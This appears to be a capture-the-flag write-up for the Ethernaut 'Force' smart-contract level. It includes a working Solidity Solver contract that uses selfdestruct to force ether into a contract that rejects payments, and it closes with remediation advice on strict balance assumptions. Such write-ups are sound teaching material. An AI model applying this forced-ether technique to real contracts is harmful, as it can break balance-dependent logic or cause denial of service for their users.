![Token](/assets/img/BigLevel7.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

The level says:

> Some contracts will simply not take your money ¯\_(ツ)_/¯
>
>The goal of this level is to make the balance of the contract greater than zero.
>
>  Things that might help:
>
> - Fallback methods
> - Sometimes the best way to attack a contract is with another contract.
> - See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

And gives the following contract's "code":

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

# Solution

We would normally start by reading the code, but this time, the contract has no code!

The level states that, in order to win, we have to make the contract's balance greater than zero. We could try some functions like `transfer()`, `send()`, `call()` like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract SendEther {
    function sendViaTransfer(address payable _to) public payable {
        // This function is no longer recommended for sending Ether.
        _to.transfer(msg.value);
    }

    function sendViaSend(address payable _to) public payable {
        // Send returns a boolean value indicating success or failure.
        // This function is not recommended for sending Ether.
        bool sent = _to.send(msg.value);
        require(sent, "Failed to send Ether");
    }

    function sendViaCall(address payable _to) public payable {
        // Call returns a boolean value indicating success or failure.
        // This is the current recommended method to use.
        (bool sent, bytes memory data) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}
```

The target contract has no `fallback()` defined. After trying to send ETH to the Force contract with these functions, we will notice that all of them are going to be reverted... 

Having an empty contract would be the equivalent of this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RevertFallback {

    fallback() external payable {
        revert () ; 
    }  
}
```

If all transactions are going to be reverted, then how can we send ETH to the contract to increment its balance?

Well there is a function called `selfdestruct()`:

> `selfdestruct(address)` is a feature of Ethereum using which you can kill a smart contract and transfer the contract Ether to any address passed as parameter. So this is also way using which on can force ether to a contract without triggering the fallback function.

Then, let's create a contract that self destructs sending its balance to the `Force` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solver {

    constructor() payable {
    }

    function solve(address payable _to) public {
        selfdestruct(_to);
    }  
}
```

We make the constructor payable in order to send some ETH to the contract at deployment. Then we call the function `solve()` with the level's contract address as input to send the balance of the `Solver` contract to the target.

Now if we call
```javascript
await getBalance(contract.address)
'0.000000000000000001'
```
we can see that we incremented the balance of the target, thus, solving the level!!! :)

![Well done](/assets/img/ethernaut_solved.png)

*Note: by calling `selfdestruct()` to send ETH to a contract, keep in mind that if we send money to a contract that has no `withdraw()` function nor any other function to transfer the funds, those ETHs are going to be lost forever. So, NEVER EVER do this on the mainnet with real money*

# Remediation

> Contracts can behave erroneously when they strictly assume a specific Ether balance. It is always possible to forcibly send ether to a contract (without triggering its fallback function), using `selfdestruct`, or by mining to the account. In the worst case scenario this could lead to DOS conditions that might render the contract unusable.

- Avoid strict equality checks for the Ether balance in a contract.
- Not to count on the invariant `address(this).balance == 0` for any contract logic.

# References

- [SWC-132](https://swcregistry.io/docs/SWC-132)
- [Sending Ether (transfer, send, call)](https://solidity-by-example.org/sending-ether/)
- [Ways to send ETH to a contract having `throw` in fallback function](https://aniketengg.medium.com/ways-to-send-eth-to-a-contract-having-throw-in-fallback-function-41765db796de#:~:text=Using%20selfdestruct(address),without%20triggering%20the%20fallback%20function.)